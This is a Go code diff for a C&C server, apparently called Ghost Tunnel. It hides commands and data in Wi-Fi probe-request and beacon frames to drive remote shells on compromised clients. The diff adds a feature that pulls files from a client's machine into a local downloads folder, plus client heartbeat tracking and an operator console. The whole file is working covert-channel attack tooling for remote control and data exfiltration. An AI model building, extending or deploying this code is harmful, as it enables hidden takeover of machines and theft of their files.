@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"encoding/binary"
+	"flag"
 	"fmt"
 	"log"
 	"math/rand"
@@ -18,32 +19,34 @@ import (
 
 var err error
 
-// GHServer is a C&C server,
+// GTServer is a C&C server,
 // handles probe-req and send beacon.
-type GHServer struct {
+type GTServer struct {
 	serverID    uint8
 	iface       string
 	handle      *pcap.Handle
-	pr          *TunnelData
-	bcn         *TunnelData
+	pr          *tunnelData
+	bcn         *tunnelData
 	curCltID    uint8
 	curOptCltID uint8
 	curCltACP   string
 	clients     map[string]*clientSession
+	file        dlFile
 }
 
 type clientSession struct {
-	id       uint8
-	name     string
-	mac      string
-	system   string
-	rSeq     uint8
-	wSeq     uint8
-	conneted bool
+	id            uint8
+	name          string
+	mac           string
+	system        string
+	rSeq          uint8
+	wSeq          uint8
+	connected     bool
+	lastHeartBeat time.Time
 }
 
-// TunnelData is the secret data hidden in probe-req and beacon.
-type TunnelData struct {
+// tunnelData is the secret data hidden in probe-req and beacon.
+type tunnelData struct {
 	mac      string
 	flag     uint8
 	dataType uint8
@@ -54,10 +57,27 @@ type TunnelData struct {
 	payload  string
 }
 
+type dlFile struct {
+	f        *os.File
+	maxSize  int
+	curSize  int
+	filename string
+	done     chan bool
+}
+
+func main() {
+	iface := flag.String("iface", "", "interface")
+	flag.Parse()
+
+	server := New(*iface)
+	server.Setup()
+	server.Run()
+}
+
 // New returns a ghost tunnel server.
-func New(device string) *GHServer {
+func New(device string) *GTServer {
 	rand.Seed(time.Now().UnixNano())
-	return &GHServer{
+	return &GTServer{
 		serverID: uint8(rand.Intn(256)),
 		iface:    device,
 		curCltID: 0,
@@ -66,17 +86,19 @@ func New(device string) *GHServer {
 }
 
 // Setup wireless adapter
-func (s *GHServer) Setup() {
+func (s *GTServer) Setup() {
 }
 
 // Run the server.
-func (s *GHServer) Run() {
+func (s *GTServer) Run() {
+	fmt.Println("[*] Server ID:", s.serverID)
 	s.handle, err = pcap.OpenLive(s.iface, 1024, true, 0)
 	// s.handle, err = pcap.OpenOffline("../caps/wcc6.pcapng")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer s.handle.Close()
+
 	err = s.handle.SetBPFFilter("type mgt subtype probe-req")
 	if err != nil {
 		log.Fatal(err)
@@ -89,18 +111,20 @@ func (s *GHServer) Run() {
 		}
 	}()
 
-	s.handleConsole()
+	go s.checkStatus()
 
+	s.handleConsole()
 }
 
-func (s *GHServer) sendServerHeartBeat() {
+func (s *GTServer) sendServerHeartBeat() {
+	time.Sleep(30 * time.Second)
 	for {
 		s.send(s.curOptCltID, TunnelConnHeartBeat, "")
 		time.Sleep(30 * time.Second)
 	}
 }
 
-func (s *GHServer) handlePacket(packet gopacket.Packet) {
+func (s *GTServer) handlePacket(packet gopacket.Packet) {
 	if l1 := packet.Layer(layers.LayerTypeDot11); l1 != nil {
 		dot11, _ := l1.(*layers.Dot11)
 
@@ -124,10 +148,13 @@ func (s *GHServer) handlePacket(packet gopacket.Packet) {
 				switch s.pr.dataType & 0xF0 {
 				case TunnelConn:
 					s.handleConn()
-					break
+
 				case TunnelShell:
 					s.handleShell()
-					break
+
+				case TunnelFile:
+					s.handleFile()
+
 				default:
 					break
 				}
@@ -136,33 +163,41 @@ func (s *GHServer) handlePacket(packet gopacket.Packet) {
 	}
 }
 
-func (s *GHServer) handleConn() {
+func (s *GTServer) handleConn() {
 	switch s.pr.dataType {
 	case TunnelConnClientReq:
-
-		if s.clients[s.pr.mac] == nil {
+		c := s.clients[s.pr.mac]
+		if c == nil {
 			s.curCltID++
 			s.clients[s.pr.mac] = &clientSession{
-				id:       s.curCltID,
-				name:     s.pr.payload,
-				mac:      s.pr.mac,
-				rSeq:     s.pr.seq,
-				wSeq:     0,
-				conneted: true,
+				id:            s.curCltID,
+				name:          s.pr.payload,
+				mac:           s.pr.mac,
+				rSeq:          s.pr.seq,
+				wSeq:          0,
+				connected:     true,
+				lastHeartBeat: time.Now(),
 			}
 			fmt.Printf("\n[*] Client %d online, MAC: %s, Name: %s\nCmd->", s.curCltID, s.pr.mac, s.pr.payload)
 			go s.send(s.curCltID, TunnelConnServerResp, s.pr.payload)
+		} else if !c.connected {
+			c.connected = true
+			c.lastHeartBeat = time.Now()
+			fmt.Printf("\nClient %d reconnected!\nCmd->", c.id)
+			go s.send(c.id, TunnelConnServerResp, s.pr.payload)
 		}
-		break
+
 	case TunnelConnHeartBeat:
-		s.clients[s.pr.mac].conneted = true
-		break
+		if c := s.clients[s.pr.mac]; c != nil {
+			c.connected = true
+			c.lastHeartBeat = time.Now()
+		}
 	default:
 		break
 	}
 }
 
-func (s *GHServer) handleShell() {
+func (s *GTServer) handleShell() {
 	switch s.pr.dataType {
 	case TunnelShellData:
 		cd, err := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
@@ -179,26 +214,68 @@ func (s *GHServer) handleShell() {
 			break
 		}
 		fmt.Print(ret)
-		break
 
 	case TunnelShellACP:
 		fmt.Printf("[*] Shell from Client %d is ready,\n", s.curOptCltID)
-		acp := []byte(s.pr.payload)
 
-		for i := len(acp)/2 - 1; i >= 0; i-- {
-			opp := len(acp) - 1 - i
-			acp[i], acp[opp] = acp[opp], acp[i]
-		}
-		s.curCltACP = fmt.Sprintf("CP%d", binary.BigEndian.Uint32([]byte(string(acp))))
+		s.curCltACP = fmt.Sprintf("CP%d", binary.LittleEndian.Uint32([]byte(s.pr.payload)))
 		fmt.Println("[*] ACP", s.curCltACP)
-		break
 
 	default:
 		break
 	}
 }
 
-func (s *GHServer) send(clientID, dataType uint8, payload string) {
+func (s *GTServer) handleFile() {
+	switch s.pr.dataType {
+	case TunnelFileInfo:
+		s.file.maxSize = int(binary.LittleEndian.Uint32([]byte(s.pr.payload)))
+		fmt.Println("[*] File size:", s.file.maxSize)
+		s.file.f, err = os.Create("./downloads/" + s.file.filename)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+	case TunnelFileData:
+		n, err := s.file.f.Write([]byte(s.pr.payload))
+		if err != nil {
+			fmt.Println(err)
+		}
+		s.file.curSize += n
+		fmt.Fprintf(os.Stdout, "[*] downloading %.4f%%, %dbyte/s\r", float64(s.file.curSize)/float64(s.file.maxSize)*100, n)
+		break
+
+	case TunnelFileEnd:
+		fmt.Fprintln(os.Stdout, "\r")
+		fmt.Println("[*] File download finished")
+		s.file.done <- true
+		s.file.f.Close()
+		break
+	case TunnelFileError:
+		fmt.Fprintln(os.Stdout, "\r")
+		fmt.Println("\r[!] download file error")
+		s.file.done <- true
+		if s.file.f != nil {
+			s.file.f.Close()
+		}
+
+		break
+	default:
+		break
+	}
+}
+
+func (s *GTServer) checkStatus() {
+	for {
+		for _, c := range s.clients {
+			if time.Since(c.lastHeartBeat) > 30*time.Second {
+				c.connected = false
+			}
+		}
+	}
+}
+
+func (s *GTServer) send(clientID, dataType uint8, payload string) {
 	var client *clientSession
 	for _, c := range s.clients {
 		// client exists
@@ -211,8 +288,8 @@ func (s *GHServer) send(clientID, dataType uint8, payload string) {
 	}
 
 	client.wSeq++
-	s.bcn = &TunnelData{
-		flag:     ValidTunnelData,
+	s.bcn = &tunnelData{
+		flag:     ValidtunnelData,
 		dataType: dataType,
 		seq:      client.wSeq,
 		clientID: clientID,
@@ -230,7 +307,7 @@ func (s *GHServer) send(clientID, dataType uint8, payload string) {
 	}
 }
 
-func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *TunnelData {
+func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *tunnelData {
 	body := probeLayer.LayerContents()
 	var p1, p2 string = "", ""
 	if layers.Dot11InformationElementID(body[0]) != layers.Dot11InformationElementIDSSID {
@@ -238,10 +315,10 @@ func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *TunnelData {
 	}
 	if body[1] > 0 { // length>0
 		ssid := body[2 : 2+body[1]]
-		if ssid[0] != ValidTunnelData {
+		if ssid[0] != ValidtunnelData {
 			return nil
 		}
-		t := &TunnelData{
+		t := &tunnelData{
 			flag:     ssid[0],
 			dataType: ssid[1],
 			seq:      ssid[2],
@@ -267,18 +344,18 @@ func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *TunnelData {
 	return nil
 }
 
-func createBeacon(t *TunnelData) []byte {
+func createBeacon(t *tunnelData) []byte {
 	buf := gopacket.NewSerializeBuffer()
 	var p1, p2 string
 	p1 = t.payload
 	p2 = ""
 
-	vendor := len(t.payload) > 24 // 32-2-6
+	vendor := len(t.payload) > 26 // 32-2-6
 	if vendor {
-		t.length = 0x1A
+		t.length = 0xAE
 		t.dataType |= DataInVendor
-		p1 = t.payload[0:24]
-		p2 = t.payload[24:]
+		p1 = t.payload[0:26]
+		p2 = t.payload[26:]
 	}
 
 	ssid := []byte{t.flag, t.dataType, t.seq, t.clientID, t.serverID, t.length}
@@ -329,7 +406,7 @@ func dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11In
 	}
 }
 
-func (s *GHServer) handleConsole() {
+func (s *GTServer) handleConsole() {
 	stdin := bufio.NewReader(os.Stdin)
 	for {
 		fmt.Print("Cmd-> ")
@@ -361,29 +438,33 @@ func (s *GHServer) handleConsole() {
 			os.Exit(0)
 
 		default:
-			fmt.Println("[!] I don't understand")
+			fmt.Println("[!] I don't understand, you may want to see help")
 		}
 	}
 }
 
-func (s *GHServer) showSessions() {
+func (s *GTServer) showSessions() {
 	if len(s.clients) == 0 {
 		fmt.Println("No clients now")
 		return
 	}
-	fmt.Println("ID           MAC                   Name		System")
+	fmt.Println("ID           MAC                   Name          Connected      LastHeartBeat-Time")
 	for _, c := range s.clients {
-		if c.conneted {
-			fmt.Printf("%-2d    %-20s   %-10s       %s\n", c.id, c.mac, c.name, c.system)
-		}
+		fmt.Printf("%-2d    %-20s   %-10s       %-5v            %v\n", c.id, c.mac, c.name, c.connected, c.lastHeartBeat.Format("15:04:05"))
 	}
 }
 
-func (s *GHServer) showHelp() {
-
+func (s *GTServer) showHelp() {
+	fmt.Println("Commands:")
+	fmt.Println("\tsessions: show all sessions")
+	fmt.Println("\tinteract: interact with selected client, interact [client ID]")
+	fmt.Println("\tdownload: download a file(<10MB) from the current client, download [filepath]")
+	fmt.Println("\t  quit  : quit current client session")
+	fmt.Println("\t  exit  : exit ghost tunnel server")
+	fmt.Println("\t  help  : show this tip")
 }
 
-func (s *GHServer) interact(clientID uint8) {
+func (s *GTServer) interact(clientID uint8) {
 	if len(s.clients) == 0 {
 		fmt.Println("[!] No clients")
 		return
@@ -408,25 +489,35 @@ func (s *GHServer) interact(clientID uint8) {
 			go s.send(s.curOptCltID, TunnelShellQuit, "")
 			for _, c := range s.clients {
 				if c.id == clientID {
-					c.conneted = false
+					c.connected = false
 					break
 				}
 			}
 			return
 		}
+
+		if len(payload) > 9 && payload[0:8] == "download" {
+			s.file.filename = payload[9:]
+			s.file.done = make(chan bool)
+			s.download(s.file.filename)
+			// block here, wait file download finish
+			<-s.file.done
+			s.send(s.curOptCltID, TunnelShellData, "")
+			continue
+		}
 		go s.send(s.curOptCltID, TunnelShellData, payload)
 	}
 }
 
-func main() {
-	server := New("wlp5s0")
-	server.Setup()
-	server.Run()
+func (s *GTServer) download(filepath string) {
+	os.Mkdir("./downloads/", 0777)
+	s.send(s.curOptCltID, TunnelFileGet, filepath)
+	s.file.curSize = 0
 }
 
-// flags in TunnelData
+// flags in tunnelData
 const (
-	ValidTunnelData uint8 = 0xFE
+	ValidtunnelData uint8 = 0xFE
 	DataInVendor    uint8 = 0x80
 )
 
@@ -445,6 +536,16 @@ const (
 	TunnelShellACP
 	TunnelShellData
 	TunnelShellQuit
+)
+
+// data type - Tunnel File
+const (
+	TunnelFile uint8 = iota + 0x30
+	TunnelFileGet
+	TunnelFileInfo
+	TunnelFileData
+	TunnelFileEnd
+	TunnelFileError
 )
 
 // Beacon options
